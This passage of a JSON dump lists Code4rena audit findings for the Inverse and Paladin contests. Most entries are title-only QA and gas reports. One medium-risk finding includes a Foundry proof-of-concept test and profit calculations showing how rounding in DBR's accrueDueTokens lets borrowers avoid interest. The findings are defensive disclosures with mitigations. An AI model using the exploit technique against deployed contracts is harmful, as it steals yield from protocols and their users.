"grade-a", "selected for report", "Q-10"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-17"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/121", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-16"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/108", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-09"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/107", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-15"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/99", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-08"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/96", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-14"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/85", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-13"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Users can avoid paying fees if they manage to update their accrued fees periodically", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/83", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "edited-by-warden", "selected for report", "M-02"], "target": "2022-10-inverse-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/DBR.sol#L287   # Vulnerability details  ## Impact  While a user borrows DOLA, his debt position in the DBR contract accrues more debt over time. However, Solidity contracts cannot update their storage automatically over time; state updates must always be triggered by externally owned accounts. For this reason, the DBR contract cannot accurately represent a user's debt position in its storage at all times. Instead, the contract offers a method `accrueDueTokens` that, when called, updates the internal storage with the debts that accrued since the last update. This method is called before all critical financial operations that depend on an accurate value of the accumulated deficit in the contract's storage. On top, this method can also be invoked permissionless at any time. Suppose a borrower manages to call this function periodically and keep the time difference between updates short. In that case, a rounding error in the computation of the accrued debt can cause the expression to round down to zero. In this case, the user successfully avoided paying interest on his debt.  ## Proof of Concept  For reference, here is the affected code:  ~~~Solidity     function accrueDueTokens(address user) public {         uint debt = debts[user];         if(lastUpdated[user] == block.timestamp) return;         uint accrued = (block.timestamp - lastUpdated[user]) * debt / 365 days;         dueTokensAccrued[user] += accrued;         totalDueTokensAccrued += accrued;         lastUpdated[user] = block.timestamp;         emit Transfer(user, address(0), accrued);     } ~~~  The problem is that the function updates the `lastUpdated[user]` storage variable even when `accrued` is `0`.  ### Example  Let's assume that the last update occurred at `t_0`. Further assume that the next update occurs at `t_1` with `t_1 - t_0 = 12s`. (`12s` is the current Ethereum block time) Suppose that the user's recorded `debt` position at `t_0 is `1,000,000 wei`. Then the accrued debt formula gives us the following:  ~~~ accrued = (t_1 - t_0) * debt / 365 days         = 12          * 1,000,000 / 31,536,000         = 1,000,000 / 31,536,000         = 0 (because unsigned integer division rounds down) ~~~  ### Maximizing profit  The accrued debt formula rounds towards zero if we have `(t_1 - t_0) * debt < 365 days`. This gives us a method to compute the maximal debt that we can deposit to make the attack more efficient:  ~~~ debt_max = 365 days / 12s -1 = 2,627,999 ~~~  Notice that an attacker is not limited to these small loans. He can split a massive loan into multiple small loans, capped at 2,627,999. To borrow X tokens (where X is given in WEI), we can compute the number of needed loans as:  ~~~ #loans = X / 2,627,999 ~~~  For example, to borrow 1 DOLA:  ~~~ #loans = 10^18 / 2,627,999 = 380517648599 ~~~  To borrow 1,000,000 DOLA we would thus need 380,517,648,599,000,000 small loans.  ### Economical feasibility  The attack would be economically feasible if the costs of the attack were lower than the interest that accrued throughout the successful attack. The dominating factor of the attack costs is the gas costs which the attacker needs to pay to update the accrued interest of the small loans every second. A clever attacker would batch as many updates into a single transaction as possible to minimize the gas overhead of the transaction. Still, at the current block time (12s), gas price (7 gwei), block gas limit (30,000,000), and current ETH price (\\$1,550.80), it's hardly imaginable that this attack is economically feasible at the moment.  ### Risk parameters  However, all these values could change in the future. And if we look at other networks, Layer2 or EVM compatible Layer1, the parameters might be different today.  Also, notice that if the contract were used to borrow a different asset than DOLA, the numbers would look drastically different. The risk increases with the asset's price and becomes bigger the fewer decimals the token uses. For example, to borrow 1 WBTC (8 decimals), we would only need 39 small loans:  ~~~ #loans = 10^8 / 2,627,999 ~39 ~~~  And to borrow WBTC worth \\$1,000,000 at a price of 20,746\\$/BTC, we would need 1864 small loans.  ~~~ #loans ~= 49*10^8 / 2,627,999 ~= 1864 ~~~  ### Foundry  The following test demonstrates how to avoid paying interest on a loan for 1h. A failing test means that the attack was successful.  ~~~ $ git diff src/test/DBR.t.sol diff --git a/src/test/DBR.t.sol b/src/test/DBR.t.sol index 3988cf7..8779da7 100644 --- a/src/test/DBR.t.sol +++ b/src/test/DBR.t.sol @@ -25,6 +25,20 @@ contract DBRTest is FiRMTest {          vm.stopPrank();      }   +    function testFail_free_borrow() public { +        uint borrowAmount =  2_627_999; + +        vm.prank(address(market)); +        dbr.onBorrow(user, borrowAmount); + +        for (uint i = 12; i <= 3600; i += 12) { +            vm.warp(block.timestamp + 12); +            dbr.accrueDueTokens(user); +        } +        assertEq(dbr.deficitOf(user), 0); +    } + +      function testOnBorrow_Reverts_When_AccrueDueTokensBringsUserDbrBelow0() public {          gibWeth(user, wethTestAmount);          gibDBR(user, wethTestAmount); ~~~  Output: ~~~ $ forge test --match-test testFail_free_borrow -vv [\u2806] Compiling... [\u280a] Compiling 1 files with 0.8.17 [\u2822] Solc 0.8.17 finished in 2.62s Compiler run successful  Running 1 test for src/test/DBR.t.sol:DBRTest [FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543) Test result: FAILED. 0 passed; 1 failed; finished in 8.03ms  Failing tests: Encountered 1 failing test in src/test/DBR.t.sol:DBRTest [FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543)  Encountered a total of 1 failing tests, 0 tests succeeded ~~~  Classified as a high medium because the yields can get stolen/denied. It's not high risk because I don't see an economically feasible exploit.  ## Tools Used  VSCode, Wolramapha, Foundry  ## Recommended Mitigation Steps  * Document the risks transparently and prominently. * Re-evaluate the risks according to the specific network parameters of every network you want to deploy to. * Do not update the `lastUpdated` timestamp of the user if the computed accrued amount was zero."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/72", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-07"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/65", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-12"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/50", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-11"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/47", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-10"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/46", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-06"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/37", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-05"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/36", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-09"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-08"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/33", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-04"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-07"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/27", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-03"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/26", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-06"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/25", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-05"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-04"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/11", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-03"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Unhandled return values of transfer and transferFrom", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/10", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor acknowledged", "selected for report", "M-01"], "target": "2022-10-inverse-findings", "body": "Unhandled return values of transfer and transferFrom"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/7", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-a", "Q-02"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/4", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-02"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-01"], "target": "2022-10-inverse-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/2", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-01"], "target": "2022-10-inverse-findings", "body": "QA Report"}, {"title": "Agreements & Disclosures", "html_url": "https://github.com/code-423n4/2022-10-inverse-findings/issues/1", "labels": [], "target": "2022-10-inverse-findings", "body": "Agreements & Disclosures"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/278", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-49"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/277", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-68"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/276", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-48"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/275", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-47"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/273", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-46"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/272", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-67"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Pausing `WardenPledge` contract, which takes effect immediately, by its owner can unexpectedly block pledge creator from calling `closePledge` or `retrievePledgeRewards` function", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/269", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "M-08"], "target": "2022-10-paladin-findings", "body": "Pausing `WardenPledge` contract, which takes effect immediately, by its owner can unexpectedly block pledge creator from calling `closePledge` or `retrievePledgeRewards` function"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/268", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-45"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/267", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-66"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "[M2] Zero protocol fee can prevent users to extendPledge for some tokens", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/266", "labels": ["bug", "disagree with severity", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-65"], "target": "2022-10-paladin-findings", "body": "[M2] Zero protocol fee can prevent users to extendPledge for some tokens"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/264", "labels": ["bug", "QA (Quality Assurance)", "grade-a", "Q-64"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/263", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-44"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/262", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-63"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/254", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-43"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/251", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-62"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/250", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-61"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/246", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-60"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/245", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-42"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Fee-on-transfer tokens cause wrong accounting or brick some functions", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/244", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-59"], "target": "2022-10-paladin-findings", "body": "Fee-on-transfer tokens cause wrong accounting or brick some functions"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/243", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-41"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/241", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-40"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/240", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-58"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/239", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-57"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/237", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-56"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": " Fees charged from entire theoretical pledge amount instead of actual pledge amount", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/235", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor acknowledged", "selected for report", "M-07"], "target": "2022-10-paladin-findings", "body": " Fees charged from entire theoretical pledge amount instead of actual pledge amount"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/231", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-55"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/230", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-54"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/228", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-39"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/225", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-38"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/224", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "grade-b", "Q-53"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/223", "labels": ["bug", "G (Gas Optimization)", "high quality report", "grade-a", "selected for report", "G-37"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/221", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-36"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Protocol doesn't work with fee-on-transfer tokens", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/220", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-52"], "target": "2022-10-paladin-findings", "body": "Protocol doesn't work with fee-on-transfer tokens"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/215", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-35"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/213", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-34"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/212", "labels": ["bug", "high quality report", "QA (Quality Assurance)", "grade-a", "selected for report", "Q-51"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/211", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-50"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/210", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-33"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/209", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-49"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/208", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-32"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/204", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-48"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/202", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-31"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/198", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-30"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/192", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-47"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/190", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-46"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/189", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-45"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/187", "labels": ["bug", "QA (Quality Assurance)", "edited-by-warden", "grade-b", "Q-44"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/185", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-29"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/178", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-43"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/177", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-28"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/174", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-27"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/173", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-42"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/172", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-26"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/168", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-41"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Reward can be over- or undercounted in `extendPledge` and `increasePledgeRewardPerVote`", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/163", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-06"], "target": "2022-10-paladin-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L387 https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L432   # Vulnerability details  ## Impact Total reward amount in `extendPledge` and `increasePledgeRewardPerVote` can be calculated incorrectly due to cached `pledgeParams.votesDifference`, which can lead to two outcomes: 1. total reward amount is higher, thus a portion of it won't be claimable; 1. total reward amount is lower, thus the pledge target won't be reached.  ## Proof of Concept When a pledge is created, the creator chooses the target\u2013the total amount of votes they want to reach with the pledge. Based on a target, the number of missing votes is calculated, which is then used to calculated the total reward amount ([WardenPledge.sol#L325-L327](https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L325-L327)): ```solidity function createPledge(     address receiver,     address rewardToken,     uint256 targetVotes,     uint256 rewardPerVote, // reward/veToken/second     uint256 endTimestamp,     uint256 maxTotalRewardAmount,     uint256 maxFeeAmount ) external whenNotPaused nonReentrant returns(uint256){     ...     // Get the missing votes for the given receiver to reach the target votes     // We ignore any delegated boost here because they might expire during the Pledge duration     // (we can have a future version of this contract using adjusted_balance)     vars.votesDifference = targetVotes - votingEscrow.balanceOf(receiver);      vars.totalRewardAmount = (rewardPerVote * vars.votesDifference * vars.duration) / UNIT;     ...   } ```  When extending a pledge or increasing a pledge reward per vote, current veToken balance of the pledge's receiver (`votingEscrow.balanceOf(receiver)`) can be different from the one it had when the pledge was created (e.g. the receiver managed to lock more CRV or some of locked tokens have expired). However `pledgeParams.votesDifference` is not recalculated ([WardenPledge.sol#L387](https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L387), [WardenPledge.sol#L432](https://github.com/code-423n4/2022-10-paladin/blob/d6d0c0e57ad80f15e9691086c9c7270d4ccfe0e6/contracts/WardenPledge.sol#L432)): ```solidity function extendPledge(     uint256 pledgeId,     uint256 newEndTimestamp,     uint256 maxTotalRewardAmount,     uint256 maxFeeAmount ) external whenNotPaused nonReentrant {     ...     Pledge storage pledgeParams = pledges[pledgeId];     ...     uint256 totalRewardAmount = (pledgeParams.rewardPerVote * pledgeParams.votesDifference * addedDuration) / UNIT;     ... }  function increasePledgeRewardPerVote(     uint256 pledgeId,     uint256 newRewardPerVote,     uint256 maxTotalRewardAmount,     uint256 maxFeeAmount ) external whenNotPaused nonReentrant {     ...     Pledge storage pledgeParams = pledges[pledgeId];     ...     uint256 totalRewardAmount = (rewardPerVoteDiff * pledgeParams.votesDifference * remainingDuration) / UNIT;     ... } ```  This can lead to two consequences: 1. When receiver's veToken balance has increased (i.e. `votesDifference` got in fact smaller), pledge creator will overpay for pledge extension and pledge reward per vote increase. This extra reward cannot be received by pledgers because a receiver cannot get more votes than `pledgeParams.targetVotes` (which is not updated when modifying a pledge):     ```solidity     function _pledge(uint256 pledgeId, address user, uint256 amount, uint256 endTimestamp) internal {         ...         // Check that this will not go over the Pledge target of votes         if(delegationBoost.adjusted_balance_of(pledgeParams.receiver) + amount > pledgeParams.targetVotes) revert Errors.TargetVotesOverflow();         ...     }     ``` 1. When receiver's veToken balance has decreased (i.e. `votesDifference` got in fact bigger), the pledge target cannot be reached because the reward amount was underpaid in `extendPledge`/`increasePledgeRewardPerVote`.  ## Tools Used Manual review ## Recommended Mitigation Steps Consider updating `votesDifference` when extending a pledge or increasing a pledge reward per vote."}, {"title": "WardenPledge accidentally inherits Ownable instead of Owner which removes an important safeguard without sponsor knowledge", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/161", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "M-05"], "target": "2022-10-paladin-findings", "body": "WardenPledge accidentally inherits Ownable instead of Owner which removes an important safeguard without sponsor knowledge"}, {"title": "Setting protocol fee to 0 will break reward tokens that don't support 0 transfers ", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/156", "labels": ["bug", "downgraded by judge", "QA (Quality Assurance)", "grade-b", "Q-40"], "target": "2022-10-paladin-findings", "body": "Setting protocol fee to 0 will break reward tokens that don't support 0 transfers "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/155", "labels": ["bug", "G (Gas Optimization)", "edited-by-warden", "grade-b", "G-25"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/152", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-24"], "target": "2022-10-paladin-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/151", "labels": ["bug", "QA (Quality Assurance)", "grade-b", "Q-39"], "target": "2022-10-paladin-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-paladin-findings/issues/146", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-23"], "target": "2022-10-paladin-findings", 